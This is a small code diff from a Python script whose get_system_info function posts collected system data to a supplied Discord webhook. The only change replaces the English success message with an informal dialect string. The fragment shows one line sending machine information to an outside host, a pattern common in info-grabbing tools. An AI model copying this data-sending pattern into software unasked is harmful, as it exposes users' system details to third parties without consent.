@@ -90,7 +90,7 @@ def get_system_info(webhook):
     # Send the data to the provided webhook
     response = requests.post(webhook, json=data)
     if response.status_code == 204:
-        print("Successfully sent system info to Discord.")
+        print("bich tsob chwya 7jettt")
     else:
         print(f"Failed to send system info. Status: {response.status_code}, {response.text}")
 
